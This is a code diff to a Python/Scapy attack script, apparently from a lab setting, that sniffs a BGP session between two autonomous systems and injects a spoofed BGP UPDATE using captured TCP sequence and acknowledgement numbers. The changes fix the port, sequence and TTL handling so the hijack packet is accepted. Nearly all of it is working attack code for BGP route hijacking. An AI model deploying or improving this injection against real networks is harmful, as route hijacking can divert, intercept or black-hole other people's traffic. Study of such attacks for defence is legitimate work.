@@ -69,10 +69,10 @@ BGP_password = ""
 #                 return True
 #     return False
 
-def inject_malicious_packet(seq_num, ack_num, dst_port, windo):
+def inject_malicious_packet(seq_num, ack_num, dst_port, windo, src_port):
     """crafts and sends a BGPUpdate to the targeted AS spoofing the AS we want to spoof"""
-    ip = IP(src=IP_TO_SPOOF, dst=IP_TARGET)
-    tcp = TCP(sport=BGP_PORT, dport=dst_port, flags="PA")
+    ip = IP(src=IP_TO_SPOOF, dst=IP_TARGET, ttl=1)
+    tcp = TCP(sport=src_port, dport=dst_port, flags="PA")
     tcp.seq = seq_num
     tcp.ack = ack_num
     tcp.window = windo
@@ -80,7 +80,7 @@ def inject_malicious_packet(seq_num, ack_num, dst_port, windo):
     # hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
     bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, next_hop=NEXT_HOP, origin=ORIGIN,
                                          multi_exit_disc=MULTI_EXIT_DISC)
-    packet = Ether(dst='c4:02:30:65:00:00', src='c4:02:30:65:00:00') / ip / tcp / bgp_packet
+    packet = Ether(dst='c4:01:7b:00:00:00', src='c4:02:7b:0f:00:00') / ip / tcp / bgp_packet
     # packet.display()
     signed_packet = sign_single_packet(packet, BGP_password)
     # recompute packet to compute checksums
@@ -109,7 +109,7 @@ def packet_callback(captured_packet):
         #     #take the seq and ack numbers from the packet
         #     SEQUENCE_NUMBER = captured_packet[TCP].seq
         #     ACK_NUMBER = captured_packet[TCP].ack
-        if captured_packet[IP].src == IP_TARGET and captured_packet[IP].dst == IP_TO_SPOOF:
+        if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
             # packet going to the AS we want to spoof from the targeted AS
             # This packet is interesting if it is an ACK for a previously sent packet
             # if captured_packet[TCP].flags == "A":
@@ -118,8 +118,8 @@ def packet_callback(captured_packet):
             # SEQUENCE_NUMBER = captured_packet[TCP].ack
             # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
 
-            SEQUENCE_NUMBER = captured_packet[TCP].ack + len(captured_packet[TCP].payload)
-            ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
+            SEQUENCE_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
+            ACK_NUMBER = captured_packet[TCP].ack # + len(captured_packet[TCP].payload)
 
             # ip_total_len = rp.getlayer(IP).len
             # ip_header_len = rp.getlayer(IP).ihl * 32 / 8
@@ -128,11 +128,12 @@ def packet_callback(captured_packet):
 
             # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
             # now we have a window to send a malicious BGP packet
-            # source_port = captured_packet[TCP].dport
-            dst_port = captured_packet[TCP].sport
-            window = captured_packet[TCP].window - len(captured_packet[TCP].payload)
-            print('Numbers: ', SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window)
-            inject_malicious_packet(SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window)
+            #source_port = captured_packet[TCP].sport
+            dst_port = captured_packet[TCP].dport
+            src_port = captured_packet[TCP].sport
+            window = captured_packet[TCP].window # - len(captured_packet[TCP].payload)
+            print('Numbers: ', SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window, src_port)
+            inject_malicious_packet(SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window, src_port)
 
 
 def main(argv):
@@ -161,3 +162,4 @@ def main(argv):
 
 if __name__ == "__main__":
     main(sys.argv)
+
